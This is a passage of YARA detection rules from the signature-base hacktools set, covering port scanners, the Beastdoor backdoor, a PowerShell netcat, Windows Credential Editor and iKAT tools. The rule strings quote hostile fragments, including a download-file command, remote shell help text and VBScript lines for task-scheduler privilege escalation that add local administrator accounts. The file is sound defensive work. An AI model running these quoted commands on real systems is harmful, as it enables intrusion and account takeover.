		$s2 = "m3hm3t_rullaz"
		$s3 = "7Projectc1"
		$s4 = "Ten-GGl\""
		$s5 = "/Moziqlxa"

	condition:
		all of them
}

rule SIGNATURE_BASE_Portscan
{
	meta:
		description = "Auto-generated rule on file portscan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "967d6e3b-ae0d-5f93-a20d-742fc010608d"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L364-L375"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a8bfdb2a925e89a281956b1e3bb32348"
		logic_hash = "d93b54ffc7416b5354304daf156908f11d7e320a91bd936e397a15ede63caae3"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s5 = "0    :SCAN BEGUN ON PORT:"
		$s6 = "0    :PORTSCAN READY."

	condition:
		all of them
}

rule SIGNATURE_BASE_Proport_Zip_Folder_Proport
{
	meta:
		description = "Auto-generated rule on file ProPort.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "cd611f6c-42ed-5cd3-a6ab-7e0970925e61"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L377-L394"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c1937a86939d4d12d10fc44b7ab9ab27"
		logic_hash = "0ee2ffc5ed243d170b8013b3a164a3719f43bd473f4af7e1a2697d88a298fe9f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Corrupt Data!"
		$s1 = "K4p~omkIz"
		$s2 = "DllTrojanScan"
		$s3 = "GetDllInfo"
		$s4 = "Compressed by Petite (c)1999 Ian Luck."
		$s5 = "GetFileCRC32"
		$s6 = "GetTrojanNumber"
		$s7 = "TFAKAbout"

	condition:
		all of them
}

rule SIGNATURE_BASE_Stealthwasp_S_Basic_Portscanner_V1_2
{
	meta:
		description = "Auto-generated rule on file StealthWasp's Basic PortScanner v1.2.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "7f706186-f2e2-5d4d-951a-2ec8fc757cec"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L396-L407"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "7c0f2cab134534cd35964fe4c6a1ff00"
		logic_hash = "b01c165b5e5be3ba6905e8bc44a14c3d7195effd058e4c0c31678777d19db8b5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Basic PortScanner"
		$s6 = "Now scanning port:"

	condition:
		all of them
}

rule SIGNATURE_BASE_Bluesportscan
{
	meta:
		description = "Auto-generated rule on file BluesPortScan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "4bcb8b7c-5e22-5496-9a29-66e85e3c3395"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L409-L420"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "6292f5fc737511f91af5e35643fc9eef"
		logic_hash = "5cb4e4b87eaf166c85d23114f5abc10ef83b4a29968bf6fef4b3fce7ff2787fd"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "This program was made by Volker Voss"
		$s1 = "JiBOo~SSB"

	condition:
		all of them
}

rule SIGNATURE_BASE_Scanarator_Iis
{
	meta:
		description = "Auto-generated rule on file iis.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "a467147b-53c8-53db-aa33-5f0e4e066988"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L422-L433"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "3a8fc02c62c8dd65e038cc03e5451b6e"
		logic_hash = "092cb902e10624b207b7932e6b3c1fe2277ed1d183e5de9ee4d07d8548e90ab6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "example: iis 10.10.10.10"
		$s1 = "send error"

	condition:
		all of them
}

rule SIGNATURE_BASE_Stealth_Stealth
{
	meta:
		description = "Auto-generated rule on file Stealth.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "5f45882e-3e27-596d-8725-fad380e1c297"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L435-L446"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8ce3a386ce0eae10fc2ce0177bbc8ffa"
		logic_hash = "e210b1a553549c22f66511dfc9d0d3f5b17f02981b9e9915827bc909f34b3262"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s3 = "<table width=\"60%\" bgcolor=\"black\" cellspacing=\"0\" cellpadding=\"2\" border=\"1\" bordercolor=\"white\"><tr><td>"
		$s6 = "This tool may be used only by system administrators. I am not responsible for "

	condition:
		all of them
}

rule SIGNATURE_BASE_Angry_IP_Scanner_V2_08_Ipscan
{
	meta:
		description = "Auto-generated rule on file ipscan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "5fbcbb95-6cd4-5587-bf44-5b5ed133ce5e"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L448-L460"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "70cf2c09776a29c3e837cb79d291514a"
		logic_hash = "1b50856ad35c146a684298a86f1629c45996ab08ffae8486a388805262ec2367"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "_H/EnumDisplay/"
		$s5 = "ECTED.MSVCRT0x"
		$s8 = "NotSupported7"

	condition:
		all of them
}

rule SIGNATURE_BASE_Crack_Loader
{
	meta:
		description = "Auto-generated rule on file Loader.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "0c4c7b69-7739-5c1b-8c7c-4aaa724e4455"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L462-L473"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "f4f79358a6c600c1f0ba1f7e4879a16d"
		logic_hash = "3380ace7c34c15dfd9a9625c8c4a1ed7e35c1cf3c2eca9b1e00dd0092d256150"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "NeoWait.exe"
		$s1 = "RRRRRRRW"

	condition:
		all of them
}

rule SIGNATURE_BASE_CN_GUI_Scanner
{
	meta:
		description = "Detects an unknown GUI scanner tool - CN background"
		author = "Florian Roth (Nextron Systems)"
		id = "ca88d4d3-5d18-5856-874f-e50deceef54f"
		date = "2014-04-10"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L475-L492"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "3c67bbb1911cdaef5e675c56145e1112"
		logic_hash = "f9281277ad7058527699d1f5037bb78be1363c90f38e2e399592c58f0b313bd7"
		score = 65
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "good.txt" fullword ascii
		$s2 = "IP.txt" fullword ascii
		$s3 = "xiaoyuer" fullword ascii
		$s0w = "ssh(" wide
		$s1w = ").exe" fullword wide

	condition:
		all of them
}

rule SIGNATURE_BASE_Beastdoor_Backdoor
{
	meta:
		description = "Detects the backdoor Beastdoor"
		author = "Florian Roth (Nextron Systems)"
		id = "64f67233-6677-53c8-b212-f1a425f78803"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L547-L567"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5ab10dda548cb821d7c15ebcd0a9f1ec6ef1a14abcc8ad4056944d060c49535a"
		logic_hash = "35aa5d66c0fd4bf1995fc23a68283e8a28f31b5a1e1f3b742dd0ab89c48bf403"
		score = 55
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Redirect SPort RemoteHost RPort  -->Port Redirector" fullword
		$s1 = "POST /scripts/WWPMsg.dll HTTP/1.0" fullword
		$s2 = "http://IP/a.exe a.exe            -->Download A File" fullword
		$s7 = "Host: wwp.mirabilis.com:80" fullword
		$s8 = "%s -Set Port PortNumber              -->Set The Service Port" fullword
		$s11 = "Shell                            -->Get A Shell" fullword
		$s14 = "DeleteService ServiceName        -->Delete A Service" fullword
		$s15 = "Getting The UserName(%c%s%c)-->ID(0x%s) Successfully" fullword
		$s17 = "%s -Set ServiceName ServiceName      -->Set The Service Name" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Powershell_Netcat
{
	meta:
		description = "Detects a Powershell version of the Netcat network hacking tool"
		author = "Florian Roth (Nextron Systems)"
		id = "e4b018c0-3214-5102-93b1-6a048324f9dd"
		date = "2014-10-10"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L569-L583"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "ff9d7c3e83fd27620559306c07556ce7afd1ba7a5db5f5c21ad0841d58b85014"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "[ValidateRange(1, 65535)]" fullword
		$s1 = "$Client = New-Object -TypeName System.Net.Sockets.TcpClient" fullword
		$s2 = "$Buffer = New-Object -TypeName System.Byte[] -ArgumentList $Client.ReceiveBufferSize" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Chinese_Hacktool_1014
{
	meta:
		description = "Detects a chinese hacktool with unknown use"
		author = "Florian Roth (Nextron Systems)"
		id = "e5db5f58-a1fd-51e0-9037-337fcca71f11"
		date = "2014-10-10"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L585-L602"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "98c07a62f7f0842bcdbf941170f34990"
		logic_hash = "ffb1f653fd536a46dae4bf2c91c3c0582b703b8f0d33838b9736083e307a8e79"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "IEXT2_IDC_HORZLINEMOVECURSOR" fullword wide
		$s1 = "msctls_progress32" fullword wide
		$s2 = "Reply-To: %s" fullword ascii
		$s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii
		$s4 = "html htm htx asp" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_CN_Hacktool_BAT_Portsopen
{
	meta:
		description = "Detects a chinese BAT hacktool for local port evaluation"
		author = "Florian Roth (Nextron Systems)"
		id = "55c3f678-ba70-5a4a-b288-9d0953eff968"
		date = "2014-12-10"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L604-L618"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "e5bc7b3264d7fc63fcc6c3d7e45859eb83b8ce60bd9a918f5eff887f626d09a3"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "for /f \"skip=4 tokens=2,5\" %%a in ('netstat -ano -p TCP') do (" ascii
		$s1 = "in ('tasklist /fi \"PID eq %%b\" /FO CSV') do " ascii
		$s2 = "@echo off" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_CN_Hacktool_Ssport_Portscanner
{
	meta:
		description = "Detects a chinese Portscanner named SSPort"
		author = "Florian Roth (Nextron Systems)"
		id = "38cc8830-efd3-51b7-8ac6-c9bf468212cb"
		date = "2014-12-10"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L620-L634"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "30c380b6c683cbcbef7072e793d94e1782206b844fa23d334b737818f0a32f9f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Golden Fox" fullword wide
		$s1 = "Syn Scan Port" fullword wide
		$s2 = "CZ88.NET" fullword wide

	condition:
		all of them
}

rule SIGNATURE_BASE_CN_Hacktool_Scanport_Portscanner
{
	meta:
		description = "Detects a chinese Portscanner named ScanPort"
		author = "Florian Roth (Nextron Systems)"
		id = "a708283e-339c-599f-9321-3b063d0076a9"
		date = "2014-12-10"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L636-L650"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "fa2dce57cc3e9baecb80b0165dfeb1af1ba4c4b30098e3b1252eb98b4fc30f7f"
		score = 70
		quality = 60
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "LScanPort" fullword wide
		$s1 = "LScanPort Microsoft" fullword wide
		$s2 = "www.yupsoft.com" fullword wide

	condition:
		all of them
}

rule SIGNATURE_BASE_CN_Hacktool_S_EXE_Portscanner
{
	meta:
		description = "Detects a chinese Portscanner named s.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "d6b35d4f-7e25-50dd-bef2-08f7033312e8"
		date = "2014-12-10"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L652-L666"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "658ae90f3af3c7abec6e692b6be350939ba7b654a9972d1a1016ff33e815a1de"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\\Result.txt" ascii
		$s1 = "By:ZT QQ:376789051" fullword ascii
		$s2 = "(http://www.eyuyan.com)" fullword wide

	condition:
		all of them
}

rule SIGNATURE_BASE_CN_Hacktool_Milkt_BAT
{
	meta:
		description = "Detects a chinese Portscanner named MilkT - shipped BAT"
		author = "Florian Roth (Nextron Systems)"
		id = "d680a5f1-6182-5bc8-99de-c3cba1a61903"
		date = "2014-12-10"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L668-L681"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "ad74c45db0ef52223eb4dd162a21c57074a4ecb869a841d836d14afc997a7478"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" ascii
		$s1 = "if not \"%Choice%\"==\"\" set Choice=%Choice:~0,1%" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_CN_Hacktool_Milkt_Scanner
{
	meta:
		description = "Detects a chinese Portscanner named MilkT"
		author = "Florian Roth (Nextron Systems)"
		id = "aa83c983-25c2-5051-88a1-fbc70d947d6e"
		date = "2014-12-10"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L683-L701"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "707cbd625b5694b710d01622a053e60828da7f70b38e43012d04364137583fe9"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Bf **************" ascii fullword
		$s1 = "forming Time: %d/" ascii
		$s2 = "KERNEL32.DLL" ascii fullword
		$s3 = "CRTDLL.DLL" ascii fullword
		$s4 = "WS2_32.DLL" ascii fullword
		$s5 = "GetProcAddress" ascii fullword
		$s6 = "atoi" ascii fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_WCE_Modified_1_1014
{
	meta:
		description = "Modified (packed) version of Windows Credential Editor"
		author = "Florian Roth (Nextron Systems)"
		id = "536d1a7f-bda1-5c22-bf72-a177468e7c42"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L738-L752"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "09a412ac3c85cedce2642a19e99d8f903a2e0354"
		logic_hash = "f094d635aabea9b9101fad3d0d23ad37692317ae5b4f636296ee612752c4421f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "LSASS.EXE" fullword ascii
		$s1 = "_CREDS" ascii
		$s9 = "Using WCE " ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Ikat_Revelations
{
	meta:
		description = "iKAT hack tool showing the content of password fields - file revelations.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "c5ef2c2a-c9c0-5c3a-bbcc-0b0949527850"
		date = "2014-05-11"
		modified = "2025-04-14"
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L796-L813"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c4e217a8f2a2433297961561c5926cbd522f7996"
		logic_hash = "0f3aa9e784beb7de8b560ecde8cc06d49e07f5e4ea4acb233ec9ac007179d7a3"
		score = 75
		quality = 60
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "The RevelationHelper.DLL file is corrupt or missing." fullword ascii
		$s8 = "BETAsupport@snadboy.com" fullword wide
		$s9 = "support@snadboy.com" fullword wide
		$s14 = "RevelationHelper.dll" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Ikat_Priv_Esc_Tasksch
{
	meta:
		description = "Task Schedulder Local Exploit - Windows local priv-esc using Task Scheduler, published by webDevil. Supports Windows 7 and Vista."
		author = "Florian Roth (Nextron Systems)"
		id = "0786b313-3154-536b-b7eb-c4d8444a309f"
		date = "2014-05-11"
		modified = "2025-04-14"
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L815-L841"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "84ab94bff7abf10ffe4446ff280f071f9702cf8b"
		logic_hash = "6d0f755a758aaac4328f5f4343b424c03c2751ddad6a1dbe7c0332171c027945"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "objShell.Run \"schtasks /change /TN wDw00t /disable\",,True" fullword ascii
		$s3 = "objShell.Run \"schtasks /run /TN wDw00t\",,True" fullword ascii
		$s4 = "'objShell.Run \"cmd /c copy C:\\windows\\system32\\tasks\\wDw00t .\",,True" fullword ascii
		$s6 = "a.WriteLine (\"schtasks /delete /f /TN wDw00t\")" fullword ascii
		$s7 = "a.WriteLine (\"net user /add ikat ikat\")" fullword ascii
		$s8 = "a.WriteLine (\"cmd.exe\")" fullword ascii
		$s9 = "strFileName=\"C:\\windows\\system32\\tasks\\wDw00t\"" fullword ascii
		$s10 = "For n = 1 To (Len (hexXML) - 1) step 2" fullword ascii
		$s13 = "output.writeline \" Should work on Vista/Win7/2008 x86/x64\"" fullword ascii
		$s11 = "Set objExecObject = objShell.Exec(\"cmd /c schtasks /query /XML /TN wDw00t\")" fullword ascii
		$s12 = "objShell.Run \"schtasks /create /TN wDw00t /sc monthly /tr \"\"\"+biatchFile+\"" ascii
		$s14 = "a.WriteLine (\"net localgroup administrators /add v4l\")" fullword ascii
		$s20 = "Set ts = fso.createtextfile (\"wDw00t.xml\")" fullword ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_Ikat_Command_Lines_Agent
{
	meta:
		description = "iKAT hack tools set agent - file ikat.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "35068d59-272d-55a6-b211-2c138276914c"
		date = "2014-05-11"
		modified = "2025-04-14"
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L843-L864"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c802ee1e49c0eae2a3fc22d2e82589d857f96d94"
		logic_hash = "a39f8e388aa11c732156753f4a19aa9cc3ccd0437de30cdcc608926320a089b0"
		score = 75
		quality = 60
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Extended Module: super mario brothers" fullword ascii
		$s1 = "Extended Module: " fullword ascii
		$s3 = "ofpurenostalgicfeeling" fullword ascii
		$s8 = "-supermariobrotheretic" fullword ascii
		$s9 = "!http://132.147.96.202:80" fullword ascii
		$s12 = "iKAT Exe Template" fullword ascii
		$s15 = "withadancyflavour.." fullword ascii
		$s16 = "FastTracker v2.00   " fullword ascii

	condition:
		4 of them
}

rule SIGNATURE_BASE_Ikat_Cmd_As_Dll
{
	meta:
		description = "iKAT toolset file cmd.dll ReactOS file cloaked"
		author = "Florian Roth (Nextron Systems)"
		id = "8d15b4b6-25f3-556c-bfa8-eba503c9c649"
		date = "2014-05-11"
		modified = "2025-04-14"
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L866-L884"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b5d0ba941efbc3b5c97fe70f70c14b2050b8336a"
		logic_hash = "3f8390fb6eb16749e63379222a5899b811e7ccd6b3b219b60d7a621fd4595e7b"
		score = 65
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "cmd.exe" fullword wide
		$s2 = "ReactOS Development Team" fullword wide
		$s3 = "ReactOS Command Processor" fullword wide
		$ext = "extension: .dll" nocase

	condition:
		all of ( $s* ) and $ext
}

rule SIGNATURE_BASE_Ikat_Tools_Nmap
{
	meta:
		description = "Generic rule for NMAP - based on NMAP 4 standalone"
		author = "Florian Roth (Nextron Systems)"
		id = "be4858e6-a8f3-55eb-9c04-f4def838dde1"
		date = "2014-05-11"
		modified = "2025-04-14"
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L886-L903"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d0543f365df61e6ebb5e345943577cc40fca8682"
		logic_hash = "f538d807ed4904a2c321385a095a97bc0d718349f7eb31a367e521228412cef2"
		score = 50
		quality = 83
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Insecure.Org" fullword wide
		$s1 = "Copyright (c) Insecure.Com" fullword wide
		$s2 = "nmap" fullword nocase
		$s3 = "Are you alert enough to be using Nmap?  Have some coffee or Jolt(tm)." ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Ikat_Startbar
{
	meta:
		description = "Tool to hide unhide the windows startbar from command line - iKAT hack tools - file startbar.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "f29f15e9-aa29-519a-b4ad-c018aac68fd6"
		date = "2014-05-11"
		modified = "2025-04-14"
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L905-L925"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0cac59b80b5427a8780168e1b85c540efffaf74f"
		logic_hash = "adb29d4903a771b0dab9dee8313878757ff12fc014da86291e32eb3ec60bf551"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Shinysoft Limited1" fullword ascii
		$s3 = "Shinysoft Limited0" fullword ascii
		$s4 = "Wellington1" fullword ascii
		$s6 = "Wainuiomata1" fullword ascii
		$s8 = "56 Wright St1" fullword ascii
		$s9 = "UTN-USERFirst-Object" fullword ascii
		$s10 = "New Zealand1" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Ikat_Tool_Generic
{
	meta:
		description = "Generic Rule for hack tool iKAT files gpdisable.exe, kitrap0d.exe, uacpoc.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "a8064a26-09c0-59f1-bdf9-628a445014ff"
		date = "2014-05-11"
		modified = "2025-04-14"
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L927-L953"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "5c5aa2d7d82d4b65541c5b6bcae6260fdaed0030493ed689363722cd78fd0a26"
		score = 55
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "814c126f21bc5e993499f0c4e15b280bf7c1c77f"
		hash1 = "75f5aed1e719443a710b70f2004f34b2fe30f2a9"
		hash2 = "b65a460d015fd94830d55e8eeaf6222321e12349"

	strings:
		$s0 = "<IconFile>C:\\WINDOWS\\App.ico</IconFile>" fullword
		$s1 = "Failed to read the entire file" fullword
